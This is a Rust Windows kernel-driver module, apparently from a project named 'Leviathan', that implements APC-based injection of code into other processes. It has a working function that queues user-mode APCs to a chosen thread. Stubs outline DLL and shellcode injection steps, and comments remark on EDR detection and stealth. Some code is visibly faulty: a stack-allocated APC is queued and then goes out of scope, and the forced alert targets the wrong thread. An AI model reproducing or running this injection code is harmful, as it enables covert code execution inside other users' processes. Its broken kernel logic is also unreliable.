//! Asynchronous Procedure Call (APC) Injection
//!
//! Provides kernel-to-user mode code execution via APC queuing.
//!
//! # APC Types
//! - **Kernel APC (Normal)**: Runs in kernel mode at PASSIVE_LEVEL
//! - **Kernel APC (Special)**: Runs in kernel mode, cannot be disabled
//! - **User APC (Regular)**: Runs in user mode when thread is alertable
//! - **User APC (Special)**: Runs in user mode, forced delivery (Win10 RS5+)
//!
//! # Use Cases
//! - DLL injection from kernel mode
//! - Shellcode execution in user context
//! - Kernel-to-user notification delivery
//! - Anti-malware process instrumentation
//!
//! # Security Considerations
//! - APC injection is monitored by Microsoft-Windows-Threat-Intelligence
//! - EDR products detect KeInsertQueueApc calls to remote processes
//! - Special User APCs bypass alertable wait requirement

use core::ptr;
use wdk::println;
use wdk_sys::{
    ntddk::{
        KeInitializeApc, KeInsertQueueApc, KeTestAlertThread,
        PsLookupProcessByProcessId, PsLookupThreadByThreadId,
        ObDereferenceObject,
    },
    KAPC, KAPC_ENVIRONMENT, KPROCESSOR_MODE, NTSTATUS, PEPROCESS, PETHREAD,
    PKAPC, PKKERNEL_ROUTINE, PKNORMAL_ROUTINE, PKRUNDOWN_ROUTINE,
    PVOID, STATUS_SUCCESS, STATUS_UNSUCCESSFUL,
};

/// APC type for initialization
#[repr(i32)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApcEnvironment {
    /// APC targets original thread environment
    OriginalApcEnvironment = 0,
    /// APC targets attached process environment
    AttachedApcEnvironment = 1,
    /// APC targets current environment
    CurrentApcEnvironment = 2,
}

/// Kernel APC wrapper
pub struct KernelApc {
    apc: KAPC,
    initialized: bool,
}

impl KernelApc {
    /// Create a new uninitialized kernel APC
    pub const fn new() -> Self {
        Self {
            apc: unsafe { core::mem::zeroed() },
            initialized: false,
        }
    }

    /// Initialize a kernel-mode APC
    ///
    /// # Parameters
    /// - `thread`: Target thread
    /// - `kernel_routine`: Callback in kernel mode (cleanup)
    /// - `rundown_routine`: Called if thread terminates before APC runs
    /// - `normal_routine`: The actual APC function to execute
    /// - `mode`: KernelMode or UserMode
    /// - `context`: User-defined context pointer
    ///
    /// # Safety
    /// Thread must remain valid until APC completes or is cancelled
    pub unsafe fn init_kernel_apc(
        &mut self,
        thread: PETHREAD,
        kernel_routine: PKKERNEL_ROUTINE,
        rundown_routine: PKRUNDOWN_ROUTINE,
        normal_routine: PKNORMAL_ROUTINE,
        mode: KPROCESSOR_MODE,
        context: PVOID,
    ) {
        unsafe {
            KeInitializeApc(
                &mut self.apc,
                thread,
                ApcEnvironment::OriginalApcEnvironment as i32,
                kernel_routine,
                rundown_routine,
                normal_routine,
                mode,
                context,
            );
        }
        self.initialized = true;
    }

    /// Initialize a user-mode APC for DLL injection
    ///
    /// # Parameters
    /// - `thread`: Target thread (must become alertable)
    /// - `apc_routine`: User-mode function to call (e.g., LdrLoadDll)
    /// - `context`: Parameter for the user-mode function
    ///
    /// # Safety
    /// - Thread must remain valid
    /// - apc_routine must be a valid user-mode address
    pub unsafe fn init_user_apc(
        &mut self,
        thread: PETHREAD,
        apc_routine: PKNORMAL_ROUTINE,
        context: PVOID,
    ) {
        unsafe {
            KeInitializeApc(
                &mut self.apc,
                thread,
                ApcEnvironment::OriginalApcEnvironment as i32,
                Some(user_apc_kernel_routine),
                None, // rundown routine
                apc_routine,
                wdk_sys::MODE::UserMode as i8,
                context,
            );
        }
        self.initialized = true;
    }

    /// Queue the APC for execution
    ///
    /// # Parameters
    /// - `arg1`, `arg2`: Additional arguments for the APC routine
    ///
    /// # Returns
    /// true if successfully queued, false otherwise
    ///
    /// # Safety
    /// APC must be initialized
    pub unsafe fn insert(&mut self, arg1: PVOID, arg2: PVOID) -> bool {
        if !self.initialized {
            return false;
        }

        unsafe { KeInsertQueueApc(&mut self.apc, arg1, arg2, 0) != 0 }
    }

    /// Get raw APC pointer
    pub fn as_ptr(&mut self) -> PKAPC {
        &mut self.apc
    }
}

/// Kernel routine for user APCs (cleanup)
///
/// Called in kernel mode when the APC is about to run or is cancelled.
///
/// # Safety
/// Called by kernel APC dispatcher
unsafe extern "C" fn user_apc_kernel_routine(
    _apc: PKAPC,
    _normal_routine: *mut PKNORMAL_ROUTINE,
    _normal_context: *mut PVOID,
    _system_argument1: *mut PVOID,
    _system_argument2: *mut PVOID,
) {
    // Free the APC structure if it was dynamically allocated
    // In this implementation, we let the caller manage memory
}

/// Inject a user-mode APC to a specific thread
///
/// # Parameters
/// - `thread_id`: Target thread ID
/// - `apc_routine`: User-mode function to execute
/// - `parameter`: Parameter passed to the function
///
/// # Returns
/// Ok(()) if APC was queued successfully
///
/// # Safety
/// - apc_routine must be a valid user-mode address
/// - Thread must eventually enter alertable wait
pub unsafe fn inject_user_apc(
    thread_id: usize,
    apc_routine: PKNORMAL_ROUTINE,
    parameter: PVOID,
) -> Result<(), NTSTATUS> {
    // Look up the thread
    let mut thread: PETHREAD = ptr::null_mut();
    let status = unsafe {
        PsLookupThreadByThreadId(thread_id as *mut _, &mut thread)
    };

    if status != STATUS_SUCCESS {
        println!("[Leviathan] APC: Failed to lookup thread {}", thread_id);
        return Err(status);
    }

    // Allocate and initialize APC
    // In production, would use pool allocation
    let mut apc = KernelApc::new();
    unsafe { apc.init_user_apc(thread, apc_routine, parameter) };

    // Queue the APC
    let success = unsafe { apc.insert(ptr::null_mut(), ptr::null_mut()) };

    if !success {
        unsafe { ObDereferenceObject(thread as *mut _) };
        return Err(STATUS_UNSUCCESSFUL);
    }

    // Force APC delivery by alerting the thread
    // This causes the APC to run on next kernel->user transition
    // even if the thread isn't in an alertable wait
    unsafe {
        KeTestAlertThread(wdk_sys::MODE::UserMode as i8);
    }

    println!("[Leviathan] APC: Queued user APC to thread {}", thread_id);

    // Dereference the thread
    unsafe { ObDereferenceObject(thread as *mut _) };

    Ok(())
}

/// Inject APCs to all threads in a process
///
/// Increases probability of execution since any thread
/// entering alertable wait will run the APC.
///
/// # Parameters
/// - `process_id`: Target process ID
/// - `apc_routine`: User-mode function to execute
/// - `parameter`: Parameter for the function
///
/// # Returns
/// Number of threads with queued APCs
pub unsafe fn inject_apc_all_threads(
    process_id: usize,
    apc_routine: PKNORMAL_ROUTINE,
    parameter: PVOID,
) -> Result<u32, NTSTATUS> {
    // Look up the process
    let mut process: PEPROCESS = ptr::null_mut();
    let status = unsafe {
        PsLookupProcessByProcessId(process_id as *mut _, &mut process)
    };

    if status != STATUS_SUCCESS {
        return Err(status);
    }

    // In production:
    // 1. Enumerate all threads using PsGetNextProcessThread
    // 2. Queue APC to each thread
    // 3. Track how many were successfully queued

    let threads_injected = 0u32;

    unsafe { ObDereferenceObject(process as *mut _) };

    Ok(threads_injected)
}

/// DLL injection via APC
///
/// Injects a DLL into a process by queuing an APC that calls LdrLoadDll.
///
/// # Parameters
/// - `process_id`: Target process
/// - `dll_path`: Full path to DLL (must be accessible from target)
///
/// # Note
/// This is a simplified example. Real implementation needs:
/// 1. Allocate memory in target process for DLL path
/// 2. Resolve LdrLoadDll address in target
/// 3. Set up proper UNICODE_STRING structure
pub mod dll_injection {
    use super::*;

    /// DLL injection context
    #[repr(C)]
    pub struct DllInjectionContext {
        /// Path to DLL (UNICODE_STRING format)
        pub dll_path: [u16; 260],
        /// Address of LdrLoadDll in target process
        pub ldr_load_dll: usize,
        /// Module handle output
        pub module_handle: usize,
    }

    /// Inject DLL into process via APC
    ///
    /// # Safety
    /// - Target process must have same architecture
    /// - DLL must be signed (if required by policy)
    #[allow(dead_code)]
    pub unsafe fn inject_dll(
        _process_id: usize,
        _dll_path: &str,
    ) -> Result<(), NTSTATUS> {
        // Implementation steps:
        // 1. Attach to target process (KeStackAttachProcess)
        // 2. Allocate memory for DLL path (ZwAllocateVirtualMemory)
        // 3. Copy DLL path to target process memory
        // 4. Find LdrLoadDll address (from ntdll.dll base)
        // 5. Create and queue APC targeting LdrLoadDll
        // 6. Detach from process

        println!("[Leviathan] DLL injection via APC requested");

        Err(STATUS_SUCCESS) // Placeholder
    }
}

/// Shellcode injection via APC
///
/// More stealthy than DLL injection but requires executable memory.
pub mod shellcode_injection {
    use super::*;

    /// Inject shellcode into process via APC
    ///
    /// # Safety
    /// - Shellcode must be position-independent
    /// - Memory protection must allow execution
    #[allow(dead_code)]
    pub unsafe fn inject_shellcode(
        _process_id: usize,
        _shellcode: &[u8],
    ) -> Result<(), NTSTATUS> {
        // Implementation steps:
        // 1. Attach to target process
        // 2. Allocate RWX memory (or RW then RX)
        // 3. Copy shellcode
        // 4. Queue APC pointing to shellcode

        println!("[Leviathan] Shellcode injection via APC requested");

        Err(STATUS_SUCCESS) // Placeholder
    }
}

/// Special User APCs (Windows 10 RS5+)
///
/// Special APCs run even when thread is not alertable.
pub mod special_apc {
    use super::*;

    /// Queue a Special User APC (RS5+)
    ///
    /// This bypasses the alertable wait requirement.
    /// The thread is interrupted to run the APC.
    ///
    /// # Note
    /// Requires NtQueueApcThreadEx2 which is only available
    /// on Windows 10 RS5 (1809) and later.
    #[allow(dead_code)]
    pub unsafe fn queue_special_apc(
        _thread_id: usize,
        _apc_routine: PKNORMAL_ROUTINE,
        _parameter: PVOID,
    ) -> Result<(), NTSTATUS> {
        // Implementation would use NtQueueApcThreadEx2
        // with QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC flag

        println!("[Leviathan] Special User APC requested (RS5+)");

        Err(STATUS_SUCCESS) // Placeholder
    }
}
